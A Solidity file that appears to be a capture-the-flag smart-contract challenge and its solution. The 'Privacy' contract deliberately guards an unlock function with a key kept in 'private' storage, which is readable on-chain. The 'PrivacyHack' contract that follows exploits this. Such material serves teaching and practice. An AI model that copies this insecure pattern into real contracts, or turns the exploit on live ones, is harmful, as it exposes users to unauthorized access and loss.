/**
 *Submitted for verification at Etherscan.io on 2022-07-11
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true; // 0
  uint256 public ID = block.timestamp; // 1
  uint8 private flattening = 10; // 2
  uint8 private denomination = 255; // 2
  uint16 private awkwardness = uint16(now); // 2
  bytes32[3] private data; // 3

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}

interface IPrivacy {
    function unlock(bytes16 _key) external;
}

contract PrivacyHack {
  IPrivacy public target;

  constructor(address _target) public {
    target = IPrivacy(_target);
  }

  function hack(bytes32 key) public {
    target.unlock(bytes16(key));
  }
}